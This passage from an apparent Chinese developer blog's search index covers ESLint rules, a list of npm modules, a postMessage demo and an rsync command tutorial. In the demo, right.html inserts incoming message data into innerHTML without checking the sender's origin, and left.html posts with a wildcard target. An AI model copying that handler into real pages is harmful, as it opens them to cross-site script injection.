class="line">&quot;new-parens&quot;: 2,//new时必须加小括号</span><br><span class="line">&quot;newline-after-var&quot;: 2,//变量声明后是否需要空一行</span><br><span class="line">&quot;object-curly-spacing&quot;: [0, &quot;never&quot;],//大括号内是否允许不必要的空格</span><br><span class="line">&quot;object-shorthand&quot;: 0,//强制对象字面量缩写语法</span><br><span class="line">&quot;one-var&quot;: 1,//连续声明</span><br><span class="line">&quot;operator-assignment&quot;: [0, &quot;always&quot;],//赋值运算符 += -=什么的</span><br><span class="line">&quot;operator-linebreak&quot;: [2, &quot;after&quot;],//换行时运算符在行尾还是行首</span><br><span class="line">&quot;padded-blocks&quot;: 0,//块语句内行首行尾是否要空行</span><br><span class="line">&quot;prefer-const&quot;: 0,//首选const</span><br><span class="line">&quot;prefer-spread&quot;: 0,//首选展开运算</span><br><span class="line">&quot;prefer-reflect&quot;: 0,//首选Reflect的方法</span><br><span class="line">&quot;quotes&quot;: [1, &quot;single&quot;],//引号类型 `` &quot;&quot; &#x27;&#x27;</span><br><span class="line">&quot;quote-props&quot;:[2, &quot;always&quot;],//对象字面量中的属性名是否强制双引号</span><br><span class="line">&quot;radix&quot;: 2,//parseInt必须指定第二个参数</span><br><span class="line">&quot;id-match&quot;: 0,//命名检测</span><br><span class="line">&quot;require-yield&quot;: 0,//生成器函数必须有yield</span><br><span class="line">&quot;semi&quot;: [2, &quot;always&quot;],//语句强制分号结尾</span><br><span class="line">&quot;semi-spacing&quot;: [0, &#123;&quot;before&quot;: false, &quot;after&quot;: true&#125;],//分号前后空格</span><br><span class="line">&quot;sort-vars&quot;: 0,//变量声明时排序</span><br><span class="line">&quot;space-after-keywords&quot;: [0, &quot;always&quot;],//关键字后面是否要空一格</span><br><span class="line">&quot;space-before-blocks&quot;: [0, &quot;always&quot;],//不以新行开始的块&#123;前面要不要有空格</span><br><span class="line">&quot;space-before-function-paren&quot;: [0, &quot;always&quot;],//函数定义时括号前面要不要有空格</span><br><span class="line">&quot;space-in-parens&quot;: [0, &quot;never&quot;],//小括号里面要不要有空格</span><br><span class="line">&quot;space-infix-ops&quot;: 0,//中缀操作符周围要不要有空格</span><br><span class="line">&quot;space-return-throw-case&quot;: 2,//return throw case后面要不要加空格</span><br><span class="line">&quot;space-unary-ops&quot;: [0, &#123; &quot;words&quot;: true, &quot;nonwords&quot;: false &#125;],//一元运算符的前/后要不要加空格</span><br><span class="line">&quot;spaced-comment&quot;: 0,//注释风格要不要有空格什么的</span><br><span class="line">&quot;strict&quot;: 2,//使用严格模式</span><br><span class="line">&quot;use-isnan&quot;: 2,//禁止比较时使用NaN，只能用isNaN()</span><br><span class="line">&quot;valid-jsdoc&quot;: 0,//jsdoc规则</span><br><span class="line">&quot;valid-typeof&quot;: 2,//必须使用合法的typeof的值</span><br><span class="line">&quot;vars-on-top&quot;: 2,//var必须放在作用域顶部</span><br><span class="line">&quot;wrap-iife&quot;: [2, &quot;inside&quot;],//立即执行函数表达式的小括号风格</span><br><span class="line">&quot;wrap-regex&quot;: 0,//正则表达式字面量用小括号包起来</span><br><span class="line">&quot;yoda&quot;: [2, &quot;never&quot;]//禁止尤达条件</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://eslint.cn/docs/user-guide/configuring">Configuring ESLint</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> eslint </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node_modules</title>
      <link href="/post/node_modules.html"/>
      <url>/post/node_modules.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>模块</th><th>说明</th></tr></thead><tbody><tr><td><a href="https://www.npmjs.com/package/ms">ms</a></td><td>转换成毫秒</td></tr><tr><td><a href="https://www.npmjs.com/package/async">async</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/lodash">lodash</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/body-parser">body-parser</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/co">co</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/copy-to">copy-to</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/content-type">content-type </a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/crc">crc</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/dot-object">dot-object</a></td><td>转换成对象</td></tr><tr><td><a href="https://www.npmjs.com/package/express-urlrewrite">express-urlrewrite</a></td><td>重写URL</td></tr><tr><td><a href="https://www.npmjs.com/package/express-validator">express-validator</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/formidable">formidable</a></td><td>文件上传</td></tr><tr><td><a href="https://www.npmjs.com/package/generic-pool">generic-pool</a></td><td>连接池</td></tr><tr><td><a href="https://www.npmjs.com/package/getmac">getmac</a></td><td>获取Mac地址</td></tr><tr><td><a href="https://www.npmjs.com/package/image-size">image-size</a></td><td>获取图片大小</td></tr><tr><td><a href="https://www.npmjs.com/package/is-type-of">is-type-of</a></td><td>判断类型</td></tr><tr><td><a href="https://www.npmjs.com/package/lru-cache">lru-cache</a></td><td>缓存</td></tr><tr><td><a href="https://www.npmjs.com/package/method-override">method-override</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/mime">mime</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/mkdirp">mkdirp</a></td><td>创建文件夹 mkdir -p</td></tr><tr><td><a href="https://www.npmjs.com/package/node-uuid">node-uuid</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/objectid">objectid</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/on-finished">on-finished</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/on-header">on-header</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/parseurl">parseurl</a></td><td>带缓存的url.parse</td></tr><tr><td><a href="https://www.npmjs.com/package/q">q</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/rc">rc </a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/redis">redis</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/request">request</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/request-id">request-id</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/response-time">response-time</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/rimraf">rimraf</a></td><td>rm -rf</td></tr><tr><td><a href="https://www.npmjs.com/package/del">del </a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/shelljs">shelljs</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/sqlstring">sqlstring</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/validator">validator</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/serve-static">serve-static</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/dateformat">dateformat</a></td><td>日期格式化</td></tr><tr><td><a href="https://www.npmjs.com/package/cros">cros</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/debug">debug</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/log4js">log4js</a></td><td>日志</td></tr><tr><td><a href="https://www.npmjs.com/package/nodemailer">nodemailer</a></td><td>发邮件</td></tr><tr><td><a href="https://www.npmjs.com/package/co-fs">co-fs</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/thunks">thunks</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/moment">moment</a></td><td>日期友好化</td></tr><tr><td><a href="https://www.npmjs.com/package/chalk">chalk</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/iconv-lite">iconv-lite</a></td><td>字符编码转换</td></tr><tr><td><a href="https://www.npmjs.com/package/ini">ini</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/qrcode-termina">qrcode-termina</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/randomstring">randomstring</a></td><td>生成随机字符串</td></tr><tr><td><a href="https://www.npmjs.com/package/xml2json">xml2json</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/protobufjs">protobufjs</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/protobufjs">http-server</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/nodemon">nodemon</a></td><td>node测试环境</td></tr><tr><td><a href="https://www.npmjs.com/package/etag">etag</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/markd">markd</a></td><td>markdown</td></tr><tr><td><a href="https://www.npmjs.com/package/xss-filters">xss-filters</a></td><td>xss</td></tr><tr><td><a href="https://www.npmjs.com/package/require-dir">require-dir</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/require-dir">log</a></td><td>轻量级日志</td></tr><tr><td><a href="https://www.npmjs.com/package/once">once</a></td><td>once callback</td></tr><tr><td><a href="https://www.npmjs.com/package/config">config</a></td><td>config</td></tr><tr><td><a href="https://www.npmjs.com/package/xhr">xhr</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/localtunnel">localtunnel</a></td><td>localtunnel</td></tr><tr><td><a href="https://www.npmjs.com/package/fs-extra">fs-extra</a></td><td>fs-extra</td></tr><tr><td><a href="https://www.npmjs.com/package/fs-extra">yargs</a></td><td>命令行参数解析</td></tr><tr><td><a href="https://www.npmjs.com/package/husky">husky</a></td><td>node githook</td></tr><tr><td><a href="https://www.npmjs.com/package/filesize">filesize</a></td><td>human readable file size</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web通信</title>
      <link href="/post/web-messaging.html"/>
      <url>/post/web-messaging.html</url>
      
        <content type="html"><![CDATA[<h3 id="web通信之跨文档通信实例页面"><a href="#web通信之跨文档通信实例页面" class="headerlink" title="web通信之跨文档通信实例页面"></a>web通信之跨文档通信实例页面</h3><h4 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>parent<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;left.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;right.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="left-html"><a href="#left-html" class="headerlink" title="left.html"></a>left.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>left<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>确认<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> eleForm = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;form&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        eleForm.<span class="property">onsubmit</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> message = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;input[type=&#x27;text&#x27;]&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 这里是关键，发送信息</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">frames</span>[<span class="number">1</span>].<span class="title function_">postMessage</span>(message, <span class="string">&quot;*&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;    </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="right-html"><a href="#right-html" class="headerlink" title="right.html"></a>right.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>right<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> eleBox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#message&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> messageHandle = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            eleBox.<span class="property">innerHTML</span> = <span class="string">&quot;接受到的信息是：&quot;</span> + e.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">addEventListener</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 接受信息</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;message&quot;</span>, messageHandle, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">attachEvent</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 接受信息，兼顾IE8之流</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">attachEvent</span>(<span class="string">&quot;onmessage&quot;</span>, messageHandle);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.zhangxinxu.com/wordpress/2012/02/html5-web-messaging-cross-document-messaging-channel-messaging/">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>window.open</title>
      <link href="/post/window.open.html"/>
      <url>/post/window.open.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://520ued.com/article/5417ef368d31c11e3b0003ff">http://520ued.com/article/5417ef368d31c11e3b0003ff</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>同步/异步&amp;阻塞/非阻塞</title>
      <link href="/post/synchronous-asynchronous-blocking-nonblocking.html"/>
      <url>/post/synchronous-asynchronous-blocking-nonblocking.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/synchronous-asynchronous-blocking-nonblocking.jpg"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.zhihu.com/question/19732473">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rsync</title>
      <link href="/post/rsync.html"/>
      <url>/post/rsync.html</url>
      
        <content type="html"><![CDATA[<h2 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h2><p>rsync命令常用工具命令 rsync命令是一个远程数据同步工具，可通过LAN&#x2F;WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rsync [OPTION]... SRC DEST</span><br><span class="line">rsync [OPTION]... SRC [USER@]host:DEST</span><br><span class="line">rsync [OPTION]... [USER@]HOST:SRC DEST</span><br><span class="line">rsync [OPTION]... [USER@]HOST::SRC DEST</span><br><span class="line">rsync [OPTION]... SRC [USER@]HOST::DEST</span><br><span class="line">rsync [OPTION]...</span><br><span class="line">rsync://[USER@]HOST[:PORT]/SRC [DEST]</span><br></pre></td></tr></table></figure><p>对应于以上六种命令格式，rsync有六种不同的工作模式：   </p><ol><li>拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号”:”分隔符时就启动这种工作模式。如：rsync -a &#x2F;data &#x2F;backup</li><li>使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号”:”分隔符时启动该模式。如：rsync -avz *.c foo:src</li><li>使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号”:”分隔符时启动该模式。如：rsync -avz foo:src&#x2F;bar &#x2F;data</li><li>从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含”::”分隔符时启动该模式。如：rsync -av <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x37;&#56;&#46;&#49;&#57;&#x32;">root@192.168.78.192</a>::www &#x2F;databack</li><li>从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含”::”分隔符时启动该模式。如：rsync -av &#x2F;databack <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#55;&#x38;&#46;&#x31;&#x39;&#x32;">root@192.168.78.192</a>::www</li><li>列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync:&#x2F;&#x2F;192.168.78.192&#x2F;www</li></ol><blockquote><p>注意：使用<code>rsync</code>时要求双方机器都要安装<code>rsync</code></p></blockquote><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">-v, --verbose 详细模式输出。</span><br><span class="line">-q, --quiet 精简输出模式。</span><br><span class="line">-c, --checksum 打开校验开关，强制对文件传输进行校验。</span><br><span class="line">-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。</span><br><span class="line">-r, --recursive 对子目录以递归模式处理。</span><br><span class="line">-R, --relative 使用相对路径信息。</span><br><span class="line">-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。</span><br><span class="line">--backup-dir 将备份文件(如~filename)存放在在目录下。</span><br><span class="line">-suffix=SUFFIX 定义备份文件前缀。</span><br><span class="line">-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。</span><br><span class="line">-l, --links 保留软链结。</span><br><span class="line">-L, --copy-links 想对待常规文件一样处理软链结。</span><br><span class="line">--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。</span><br><span class="line">--safe-links 忽略指向SRC路径目录树以外的链结。</span><br><span class="line">-H, --hard-links 保留硬链结。</span><br><span class="line">-p, --perms 保持文件权限。</span><br><span class="line">-o, --owner 保持文件属主信息。</span><br><span class="line">-g, --group 保持文件属组信息。</span><br><span class="line">-D, --devices 保持设备文件信息。</span><br><span class="line">-t, --times 保持文件时间信息。</span><br><span class="line">-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。</span><br><span class="line">-n, --dry-run现实哪些文件将被传输。</span><br><span class="line">-w, --whole-file 拷贝文件，不进行增量检测。</span><br><span class="line">-x, --one-file-system 不要跨越文件系统边界。</span><br><span class="line">-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。</span><br><span class="line">-e, --rsh=command 指定使用rsh、ssh方式进行数据同步。</span><br><span class="line">--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。</span><br><span class="line">-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。</span><br><span class="line">--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。</span><br><span class="line">--delete 删除那些DST中SRC没有的文件。</span><br><span class="line">--delete-excluded 同样删除接收端那些被该选项指定排除的文件。</span><br><span class="line">--delete-after 传输结束以后再删除。</span><br><span class="line">--ignore-errors 及时出现IO错误也进行删除。</span><br><span class="line">--max-delete=NUM 最多删除NUM个文件。</span><br><span class="line">--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。</span><br><span class="line">--force 强制删除目录，即使不为空。</span><br><span class="line">--numeric-ids 不将数字的用户和组id匹配为用户名和组名。</span><br><span class="line">--timeout=time ip超时时间，单位为秒。</span><br><span class="line">-I, --ignore-times 不跳过那些有同样的时间和长度的文件。</span><br><span class="line">--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。</span><br><span class="line">--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。</span><br><span class="line">-T --temp-dir=DIR 在DIR中创建临时文件。</span><br><span class="line">--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。</span><br><span class="line">-P 等同于 --partial。</span><br><span class="line">--progress 显示备份过程。</span><br><span class="line">-z, --compress 对备份的文件在传输时进行压缩处理。</span><br><span class="line">--exclude=PATTERN 指定排除不需要传输的文件模式。</span><br><span class="line">--include=PATTERN 指定不排除而需要传输的文件模式。</span><br><span class="line">--exclude-from=FILE 排除FILE中指定模式的文件。</span><br><span class="line">--include-from=FILE 不排除FILE指定模式匹配的文件。</span><br><span class="line">--version 打印版本信息。</span><br><span class="line">--address 绑定到特定的地址。</span><br><span class="line">--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。</span><br><span class="line">--port=PORT 指定其他的rsync服务端口。</span><br><span class="line">--blocking-io 对远程shell使用阻塞IO。</span><br><span class="line">-stats 给出某些文件的传输状态。</span><br><span class="line">--progress 在传输时现实传输过程。</span><br><span class="line">--log-format=formAT 指定日志文件格式。</span><br><span class="line">--password-file=FILE 从FILE中得到密码。</span><br><span class="line">--bwlimit=KBPS 限制I/O带宽，KBytes per second。</span><br><span class="line">-h, --help 显示帮助信息。</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ol><li><p>同步本地文件夹</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz src dest</span><br></pre></td></tr></table></figure></li><li><p>拉取远程文件到本地</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azve &#x27;ssh&#x27; root@10.0.1.4:/root/logs .</span><br></pre></td></tr></table></figure><blockquote><p>使用ssh方式后台传输时可以配合sshpass指定密码</p></blockquote></li><li><p>传送本地文件到远程</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azve &#x27;ssh&#x27; . root@10.0.1.4:/root/logs</span><br></pre></td></tr></table></figure></li><li><p>指定SSH端口</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azve &#x27;ssh -p 9922&#x27; data root@10.0.1.4:/root/</span><br></pre></td></tr></table></figure></li><li><p>删除远程有本地没有的文件</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azve &#x27;ssh&#x27; --delete data root@10.0.1.4:/root/</span><br></pre></td></tr></table></figure></li><li><p>断线续传</p><p> -P </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azvPe &#x27;ssh&#x27; root@10.0.1.4:/root/logs .</span><br></pre></td></tr></table></figure><p> –bwlimit &#x2F;&#x2F; 限速</p></li><li><p>排除文件夹</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz --exclude &quot;.git&quot; src dest</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a 